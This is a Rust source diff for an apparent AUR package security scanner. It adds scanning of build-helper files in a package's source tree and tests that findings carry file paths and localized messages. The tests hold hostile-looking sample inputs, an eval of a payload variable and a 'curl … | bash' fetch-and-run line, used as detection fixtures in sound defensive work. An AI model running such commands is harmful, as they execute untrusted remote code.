@@ -531,9 +531,8 @@ fn scan_script(text: &str, sources: &[SourceHost], config: &Config, findings: &m
         scan_dangerous_line(&lower, &line, lineno, findings);
 
         // YARA-style signature database (miners, exfil, persistence, …) plus any
-        // user-defined `[signatures]` rules.
-        crate::rules::scan_line(&lower, lineno, findings);
-        crate::rules::scan_custom(&lower, lineno, &config.signatures.custom, findings);
+        // user-defined `[signatures]` rules and the `rules.d/` overlay.
+        scan_signatures(&lower, lineno, config, findings);
     }
 
     // install() function or install= directive present.
@@ -992,9 +991,78 @@ fn scan_install_scripts(
                 flagged_network = true;
             }
             scan_dangerous_line(&lower, &line, lineno, findings);
-            crate::rules::scan_line(&lower, lineno, findings);
-            crate::rules::scan_custom(&lower, lineno, &config.signatures.custom, findings);
+            scan_signatures(&lower, lineno, config, findings);
         }
+    }
+}
+
+/// Run the full signature stack over one (comment-stripped, lower-cased)
+/// line: the built-in database (minus any `code` a loaded rule overrides),
+/// the `rules.d/` overlay (T2.1), and inline `[signatures]` custom rules from
+/// `config.toml`. Shared by the `PKGBUILD` pass, `.install` scriptlets, and
+/// [`scan_source_file`] so all three see the same signatures.
+fn scan_signatures(lower: &str, lineno: usize, config: &Config, findings: &mut Vec<Finding>) {
+    crate::rules::scan_line_except(lower, lineno, &config.overlay.overridden, findings);
+    config.overlay.scan_line(lower, lineno, findings);
+    crate::rules::scan_custom(lower, lineno, &config.signatures.custom, findings);
+}
+
+/// Scan an arbitrary file from the package's *source tree* (a build-helper
+/// script, `setup.py`, `Makefile`, an unreferenced `.install`, …) with the
+/// same line-level rules used for the `PKGBUILD` itself — T2.4 of the
+/// security roadmap. Malware does not have to live in the `PKGBUILD`: a
+/// committed shell script or `setup.py` runs with exactly the same trust.
+///
+/// `path` is the file's path relative to the tree root; every finding is
+/// prefixed with it so multi-file hits stay attributable. `lang` localizes
+/// the message the same way [`analyze_with`] does. Called from
+/// [`crate::srcscan::scan_text_files`].
+pub fn scan_source_file(
+    path: &str,
+    text: &str,
+    lang: Lang,
+    opts: ScanOpts,
+    config: &Config,
+    findings: &mut Vec<Finding>,
+) {
+    let mut local = Vec::new();
+    // AST pass — authoritative for `eval` / pipe-into-shell, same as the
+    // PKGBUILD's own `scan_script`; falls back to textual matching if the
+    // grammar can't parse this file (e.g. it isn't actually shell).
+    match astscan::scan(text) {
+        Some(mut ast) => local.append(&mut ast),
+        None => textual_exec_fallback(text, &mut local),
+    }
+    for (idx, raw) in text.lines().enumerate() {
+        let line = strip_comment(raw);
+        let lower = line.to_ascii_lowercase();
+        if lower.trim().is_empty() {
+            continue;
+        }
+        let lineno = idx + 1;
+        scan_dangerous_line(&lower, &line, lineno, &mut local);
+        scan_signatures(&lower, lineno, config, &mut local);
+    }
+    scan_deep(
+        text,
+        ScanOpts {
+            verbose: false,
+            ..opts
+        },
+        config,
+        &mut local,
+    );
+    local.retain(|f| !config.ignores(f.code));
+    localize(lang, &mut local);
+    for f in local {
+        // `Finding.line` is meaningful only within one file; fold it into a
+        // `path:line` location string instead since this scan spans many.
+        let loc = match f.line {
+            Some(l) => format!("{path}:{l}"),
+            None => path.to_string(),
+        };
+        findings
+            .push(Finding::meta(f.severity, f.code, format!("{loc}: {}", f.message)).with_arg(loc));
     }
 }
 
@@ -1756,5 +1824,44 @@ mod tests {
         assert!(is_ip_literal("1.2.3.4"));
         assert!(!is_ip_literal("github.com"));
         assert!(!is_ip_literal("999.1.1.1"));
+    }
+
+    #[test]
+    fn scan_source_file_prefixes_path_and_line() {
+        let mut findings = Vec::new();
+        scan_source_file(
+            "scripts/setup.py",
+            "print('hi')\neval(\"$payload\")\n",
+            Lang::En,
+            ScanOpts::default(),
+            &Config::default(),
+            &mut findings,
+        );
+        let f = findings
+            .iter()
+            .find(|f| f.code == "EVAL")
+            .expect("EVAL finding");
+        assert!(f.message.starts_with("scripts/setup.py:2:"));
+        assert_eq!(f.arg.as_deref(), Some("scripts/setup.py:2"));
+    }
+
+    #[test]
+    fn scan_source_file_localizes_message() {
+        let mut config = Config::default();
+        config.ui.lang = Lang::Tr;
+        let mut findings = Vec::new();
+        scan_source_file(
+            "build.sh",
+            "curl https://x/i.sh | bash\n",
+            Lang::Tr,
+            ScanOpts::default(),
+            &config,
+            &mut findings,
+        );
+        let f = findings
+            .iter()
+            .find(|f| f.code == "CURL_PIPE_SH")
+            .expect("CURL_PIPE_SH finding");
+        assert!(f.message.starts_with("build.sh:1:"));
     }
 }
